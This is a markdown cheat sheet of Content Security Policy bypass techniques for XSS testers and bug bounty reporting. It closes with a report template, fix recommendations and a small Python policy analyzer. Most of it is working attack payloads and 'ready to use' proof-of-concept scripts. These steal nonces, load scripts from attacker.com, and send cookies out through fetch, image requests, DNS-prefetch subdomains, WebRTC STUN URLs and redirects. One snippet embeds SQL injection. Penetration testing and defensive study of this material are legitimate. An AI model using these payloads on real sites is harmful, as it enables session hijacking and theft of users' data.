


# 🛡️ CSP Bypass Master Cheat Sheet

---

## 🎯 Quick Start: Where to Find CSP Bugs?

```markdown
🔍 Discovery Checklist:
- [ ] Check response headers: `Content-Security-Policy` or `Report-Only`
- [ ] Look for `<meta http-equiv="Content-Security-Policy">` in HTML
- [ ] Test if input reflects into CSP header (policy injection)
- [ ] Check if CSP blocks your XSS payload → time to bypass!
- [ ] Look for allowed third-party domains in script-src/img-src
- [ ] Check for missing directives: base-uri, form-action, object-src
```

### 🚨 Red Flags in CSP (Easy Wins):

```
❌ 'unsafe-inline' in script-src → XSS works normally
❌ 'unsafe-eval' in script-src → try data: or base64 payloads
❌ '*' or 'https:' in script-src → load your script from anywhere
❌ strict-dynamic + nonce → steal nonce, reuse it
❌ Missing base-uri → hijack relative script loads
❌ Allowed CDN like ajax.googleapis.com → JSONP or Angular bypass
❌ report-uri with user input → policy injection possible
```

---

## 🔍 Step 1: Detect & Analyze CSP

### 📡 Find CSP Header

```bash
# Using curl:
curl -sI https://target.com | grep -i content-security-policy

# Using Burp Suite:
1. Intercept response → check Headers tab
2. Right-click header → "Copy value" for analysis

# Using browser console:
document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content
```

### 🧪 Test If CSP Is Actually Blocking

```javascript
// In browser console, try simple XSS:
<img src=x onerror=alert(1)>

// If nothing happens → CSP is blocking → good target!
// If alert shows → CSP not effective or misconfigured
```

### 📋 Analyze Policy Structure

```javascript
// Parse CSP directives easily:
function parseCSP(cspString) {
    return Object.fromEntries(
        cspString.split(';').map(d => {
            const [key, ...val] = d.trim().split(' ');
            return [key, val.join(' ')];
        })
    );
}

// Example usage:
const csp = "default-src 'self'; script-src 'self' https://cdn.com;";
console.log(parseCSP(csp));
// Output: { 'default-src': "'self'", 'script-src': "'self' https://cdn.com" }
```

---

## 🧩 Step 2: Choose Your Bypass Technique

### 🗂️ Bypass Decision Tree

```
Found CSP blocking XSS?
│
├─► Contains 'unsafe-inline'? → Normal XSS payload ✅
│
├─► Contains 'unsafe-eval'? → Try data: URI or base64 ✅
│
├─► Contains 'strict-dynamic'? → Steal nonce/hash, reuse ✅
│
├─► Contains wildcard '*' or 'https:'? → Load external script ✅
│
├─► Allows specific CDN (ajax.googleapis.com, cdnjs)? → JSONP/Angular bypass ✅
│
├─► Missing base-uri? → Hijack <base> tag ✅
│
├─► User input in report-uri? → Policy injection ✅
│
├─► File upload + 'self'? → Upload .wave/.js polyglot ✅
│
├─► All external blocked? → DNS/WebRTC exfil or timing attack ✅
│
└─► Still stuck? → Check third-party abuse or RPO ✅
```

---

## 💥 Payloads Library 


### 🔸 Basic Bypasses
```html
<!-- unsafe-inline -->
<script>alert(document.cookie)</script>

<!-- unsafe-eval + base64 -->
<script src="data:;base64,YWxlcnQoMSk="></script>

<!-- wildcard (*) -->
<script src="https://attacker.com/evil.js"></script>
<script src="data:text/javascript,alert(1)"></script>

<!-- strict-dynamic + nonce reuse -->
<script>
  const nonce = document.querySelector('[nonce]')?.nonce;
  if(nonce) {
    const s = document.createElement('script');
    s.src = 'https://attacker.com/payload.js';
    s.nonce = nonce;
    document.body.appendChild(s);
  }
</script>
```

### 🔸 JSONP Endpoints 

```html
<!-- Google Search -->
<script src="https://www.google.com/complete/search?client=chrome&q=x&callback=alert"></script>

<!-- YouTube oEmbed -->
<script src="https://www.youtube.com/oembed?callback=alert&format=json"></script>

<!-- Google Accounts -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>

<!-- Generic JSONP pattern -->
<script src="https://trusted-cdn.com/api?callback=YOUR_PAYLOAD"></script>
```

### 🔸 AngularJS Bypasses (when angular.js allowed)

```html
<!-- Simple alert -->
<div ng-app>{{$on.curry.call().alert(1)}}</div>

<!-- With CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- Via class name -->
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">test</strong>
</div>

<!-- With Prototype.js helper -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>{{$on.curry.call().alert('XSS')}}</div>
```

### 🔸 Google reCAPTCHA Abuse

```html
<!-- Load reCAPTCHA JS (if allowed) -->
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert via Angular event -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce via reCAPTCHA context -->
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  n=doc.defaultView.top.document.querySelector("[nonce]");
  s=doc.createElement("script");
  s.src="//attacker.com/evil.js";
  s.nonce=n.nonce;
  doc.body.appendChild(s)'>
```

### 🔸 Base-Uri Hijack (when missing)

```html
<!-- Hijack relative script loads -->
<base href="https://attacker.com/">
<script src="/js/app.js"></script>
<!-- Actually loads: https://attacker.com/js/app.js -->

<!-- With nonce (if page uses nonce for relative scripts) -->
<base href="https://attacker.com/">
<script src="/js/app.js" nonce="stolen-nonce"></script>
```

### 🔸 Policy Injection (when input reflects in CSP)

```http
# Inject via report-uri parameter:
?report=;script-src-elem *;report-uri /log

# Chrome-specific bypass:
;script-src-elem 'unsafe-inline';script-src-attr 'unsafe-inline'

# Edge bypass (drops entire policy):
;_
```

### 🔸 File Upload + 'self' Bypass

```html
<!-- Upload file with weird extension (.wave, .xyz) -->
<!-- Then load it as script: -->
<script src="/uploads/evil.wave"></script>

<!-- Polyglot file (valid image + JS): -->
<!-- Content: GIF89a;alert(1);// -->
<!-- Save as: polyglot.gif -->
<!-- Load: <script src="/uploads/polyglot.gif"></script> -->
```

### 🔸 Third-Party Domain Abuse

```javascript
// Firebase exfil (if *.firebaseapp.com allowed)
fetch(`https://your-project.firebaseio.com/leak.json?data=${btoa(document.cookie)}`);

// jsdelivr exec (if *.jsdelivr.net allowed)
// 1. Upload evil.js to your jsdelivr repo
// 2. Load: <script src="https://cdn.jsdelivr.net/gh/your/repo/evil.js"></script>

// Facebook Pixel exfil
fbq('init', 'YOUR_APP_ID');
fbq('trackCustom', 'Leak', {data: document.cookie});
```

### 🔸 RPO - Relative Path Overwrite

```html
<!-- CSP allows: https://example.com/scripts/react/ -->
<!-- Payload: -->
<script src="https://example.com/scripts/react/..%2f..%2fadmin/evil.js"></script>
<!-- Browser sees: /scripts/react/..%2f..%2fadmin/evil.js (allowed) -->
<!-- Server decodes: /scripts/admin/evil.js (bypassed!) -->
```

### 🔸 Redirect Bypass

```html
<!-- CSP: script-src https://google.com/a/b/c/ -->
<!-- Payload: -->
<script src="https://google.com/redirect?url=/a/b/c/../../evil.js"></script>
<!-- Redirect happens AFTER CSP check → bypass! -->
```

### 🔸 Service Worker Bypass

```javascript
// If you can register a service worker:
navigator.serviceWorker.register('/sw.js');

// Inside sw.js (not restricted by page CSP):
importScripts('https://attacker.com/evil.js');
```

### 🔸 Exfiltration When All Blocked

```javascript
// DNS prefetch exfil:
const leak = btoa(document.cookie).replace(/=/g,'');
const link = document.createElement('link');
link.rel = 'dns-prefetch';
link.href = `//${leak}.attacker.com`;
document.head.appendChild(link);

// WebRTC exfil (bypasses connect-src):
const pc = new RTCPeerConnection({
    iceServers: [{ urls: `stun:${btoa(document.cookie)}.attacker.com` }]
});
pc.createDataChannel('');
pc.createOffer().then(o => pc.setLocalDescription(o));

// Location redirect:
document.location = `https://attacker.com/?c=${encodeURIComponent(document.cookie)}`;

// Meta refresh (no data leak, just redirect):
document.head.insertAdjacentHTML('beforeend', 
  `<meta http-equiv="refresh" content="0;url=https://attacker.com/?c=${btoa(document.cookie)}">`);
```

### 🔸 Timing Attack (for blind data extraction)

```javascript
// When you can control response time (e.g., SQLi sleep)
async function leakChar(prefix, char) {
    const start = performance.now();
    document.getElementById('f').src = 
        `/search?q=' OR flag LIKE '${prefix}${char}%' AND SLEEP(0.3)--`;
    await new Promise(r => document.getElementById('f').onload = r);
    return (performance.now() - start) > 250;
}

// Usage:
const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_";
let flag = "known_prefix";
for(let i=0; i<30; i++) {
    for(let c of alphabet) {
        if(await leakChar(flag, c)) {
            flag += c;
            console.log("Found:", flag);
            break;
        }
    }
}
// Exfil final flag:
new Image().src = `https://attacker.com/?flag=${flag}`;
```

### 🔸 Dangling Markup + CSP

```html
<!-- When img-src * is allowed but script blocked -->
<img src="https://attacker.com/leak?data=
<!-- Browser auto-closes and sends request with data after "=" -->

<!-- With CSRF + SQLi combo (from CTF): -->
<script>
  fetch('/admin/search/x\' union select flag from challenge#')
    .then(r=>r.text())
    .then(data => new Image().src = `https://attacker.com/?${data}`);
</script>
```

### 🔸 PHP Server-Side Bypasses

```bash
# max_input_vars bypass (headers already sent):
curl "http://target.com/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1001"
# PHP warning sent before CSP header → CSP ignored

# Response buffer overload:
# Send enough data to fill 4096 bytes buffer with warnings
# CSP header never sent → XSS works
```

### 🔸 SOME + WordPress JSONP

```html
<!-- If WordPress installed and /wp-json/ allowed -->
<script src="/wp-json/wp/v2/users/1?_jsonp=alert"></script>

<!-- SOME attack pattern:
1. Load vulnerable endpoint in iframe
2. Use opener object to manipulate parent page
3. Bypass CSP via same-origin trust
-->
```

### 🔸 CSP Report-Only Abuse

```http
# If you can inject into Content-Security-Policy-Report-Only:
# Make it point to your server + wrap sensitive JS in <script>
# Violation report will send part of your script (with secrets) to your server

# Example payload in reflected parameter:
?x=<script>var secret=document.cookie</script>;report-uri https://attacker.com/log
```

---

## 🧪 POC Templates (Ready to Use)

### 🔹 Basic XSS POC with CSP Check

```html
<!DOCTYPE html>
<html>
<head><title>CSP Test</title></head>
<body>
  <h2>CSP Bypass POC</h2>
  <div id="result">Testing...</div>
  
  <script>
    // Check if CSP exists
    const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content 
                || 'Not found in meta';
    
    // Try payload
    const payload = "<img src=x onerror=\"document.getElementById('result').innerHTML='✅ CSP BYPASSED - Cookie: '+document.cookie\">";
    
    // Inject and test
    setTimeout(() => {
      document.body.insertAdjacentHTML('beforeend', payload);
    }, 1000);
  </script>
</body>
</html>
```

### 🔹 Nonce Stealer POC

```javascript
// Run in browser console on target page
(function stealNonce() {
  const nonce = document.querySelector('script[nonce]')?.nonce 
             || document.querySelector('[nonce]')?.nonce;
  
  if(!nonce) {
    console.log('❌ No nonce found');
    return;
  }
  
  console.log('✅ Nonce found:', nonce);
  
  // Create malicious script with stolen nonce
  const s = document.createElement('script');
  s.src = 'https://attacker.com/payload.js';
  s.nonce = nonce;
  document.body.appendChild(s);
  
  // Also exfil nonce for later use
  fetch(`https://attacker.com/log?nonce=${nonce}&url=${location.href}`);
})();
```

### 🔹 JSONP Scanner (Auto-find endpoints)

```javascript
// Run in console or save as bookmarklet
(async function scanJSONP() {
  const domains = ['google.com', 'youtube.com', 'ajax.googleapis.com', 'cdnjs.cloudflare.com'];
  const callbacks = ['alert', 'confirm', 'prompt', 'console.log'];
  
  for(const domain of domains) {
    for(const cb of callbacks) {
      const url = `https://${domain}/some/path?callback=${cb}&test=1`;
      try {
        const resp = await fetch(url, {mode: 'no-cors'});
        console.log(`🔍 Tested: ${url}`);
        // If no CORS error in console + callback executed → potential bypass
      } catch(e) {
        console.log(`❌ Failed: ${url}`);
      }
    }
  }
})();
```

### 🔹 DNS Exfil POC (When all else fails)

```javascript
(function exfilViaDNS() {
  const data = btoa(document.cookie + '|' + location.href).replace(/=/g, '');
  const chunks = data.match(/.{1,50}/g) || [data];
  
  chunks.forEach((chunk, i) => {
    const img = new Image();
    img.src = `https://${chunk}.chunk-${i}.attacker.com/pixel.gif`;
    // Browser will DNS-resolve this → you see it in your DNS logs
  });
  
  console.log(`📤 Exfiltrating ${chunks.length} chunks via DNS...`);
})();
```

---

## 🛠️ Tools & Resources

### 🔹 Online Scanners
| Tool | URL | Use Case |
|------|-----|----------|
| CSP Evaluator | https://csp-evaluator.withgoogle.com | Analyze policy strength |
| CSP Validator | https://cspvalidator.org | Check syntax & best practices |
| Report URI | https://report-uri.com | Collect violation reports |
| JSONBee | https://github.com/zigoo0/JSONBee | Ready JSONP endpoints |

### 🔹 Browser Extensions
```
✅ ModHeader (Chrome/Firefox) → Test removing CSP header
✅ CSP Reporter → See violations in real-time
✅ Wappalyzer → Detect frameworks (Angular, WordPress) for targeted bypasses
```



### 🔹 Python Helper Script

```python
#!/usr/bin/env python3
# csp_tester.py - Quick CSP analysis
import requests, re, sys

def analyze_csp(url):
    r = requests.get(url)
    csp = r.headers.get('Content-Security-Policy', '')
    
    print(f"🎯 Target: {url}")
    print(f"📋 CSP: {csp or '❌ None'}\n")
    
    if not csp:
        print("✅ No CSP → XSS likely works!")
        return
    
    # Check for dangerous values
    dangers = {
        "'unsafe-inline'": "Allows inline XSS",
        "'unsafe-eval'": "Allows eval() bypasses", 
        "*": "Allows any source",
        "https:": "Allows any HTTPS source",
        "report-uri": "Check if user-controlled → policy injection"
    }
    
    for danger, note in dangers.items():
        if danger in csp:
            print(f"⚠️  Found '{danger}' → {note}")
    
    # Check for missing critical directives
    critical = ['base-uri', 'form-action', 'object-src']
    for c in critical:
        if c + '-' not in csp and c not in csp:
            print(f"❓ Missing '{c}' → potential bypass vector")

if __name__ == "__main__":
    analyze_csp(sys.argv[1] if len(sys.argv) > 1 else "https://example.com")
```

---

## 📝 Report Writing Template

```markdown
## 🐛 Vulnerability: CSP Bypass via [Technique Name]

### 🔍 Summary
[Brief: What CSP rule was bypassed and how]

### 🎯 Impact
- Execute arbitrary JavaScript despite CSP
- Steal cookies/tokens via exfiltration
- Perform actions as victim (CSRF + XSS combo)
- Risk Level: [High/Medium]

### 📍 Steps to Reproduce
1. Navigate to: `https://target.com/vulnerable-page`
2. Observe CSP header: `[copy full CSP value]`
3. Send payload: `[your payload]`
4. Result: [screenshot/console output showing bypass]

### 🧪 Proof of Concept
```html
[paste minimal working POC here]
```

### 🔬 Technical Details
- CSP Directive Bypassed: `script-src` / `img-src` / etc.
- Bypass Technique: [nonce reuse / JSONP / policy injection / etc.]
- Browser Tested: Chrome XX, Firefox XX
- Why it works: [brief explanation]

### 💡 Recommendations

```http
# Current (vulnerable):
script-src 'self' https://ajax.googleapis.com 'unsafe-inline'

# Fixed version:
script-src 'self' 'nonce-{{random}}' https://trusted-cdn.com;
report-uri /csp-violations;
```

Additional:
- Remove 'unsafe-inline' and 'unsafe-eval'
- Use nonces with cryptographically random values per request
- Add missing directives: base-uri 'self'; form-action 'self';
- Monitor violations via report-uri

### 🔗 References
- [HackTricks CSP Bypass](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/content-security-policy-csp-bypass)
- [PortSwigger CSP Labs](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com)


---

## 🔄 Quick Reference Table

| Scenario | Bypass Technique | Payload Example |
|----------|-----------------|----------------|
| `'unsafe-inline'` | Normal XSS | `<script>alert(1)</script>` |
| `'unsafe-eval'` | data: URI | `<script src=";base64,...">` |
| `strict-dynamic` | Nonce reuse | `s.nonce=stolen;appendChild(s)` |
| Wildcard `*` | External script | `<script src=https://attacker.com/x.js>` |
| Allowed CDN | JSONP/Angular | `<script src=cdn?callback=alert>` |
| Missing `base-uri` | Hijack base | `<base href=https://attacker.com/>` |
| Input in `report-uri` | Policy injection | `;script-src-elem *` |
| File upload + `'self'` | Weird extension | `<script src=/uploads/x.wave>` |
| All blocked | DNS/WebRTC exfil | `new Image().src='//'+data+'.attacker.com'` |
| Redirect allowed | Path bypass | `<script src=trusted/redirect?url=evil>` |
| Service Worker | importScripts | `importScripts('https://attacker.com/x.js')` |
| PHP server | max_input_vars | `?xss=payload&A=1&A=2&...&A=1001` |

---

## 🚀 Final Checklist Before Reporting

```markdown
- [ ] Confirmed CSP is actually blocking (tested without it in Burp)
- [ ] Bypass works in latest Chrome/Firefox (not just old browser)
- [ ] POC is minimal and reproducible (no extra noise)
- [ ] Impact is clear (cookie steal? account takeover? data leak?)
- [ ] Checked for false positive (is it really a bypass or just misconfig?)
- [ ] Included fix recommendation (not just "remove CSP")
- [ ] Tested on mobile/desktop if relevant
- [ ] Documented browser versions used
```

---
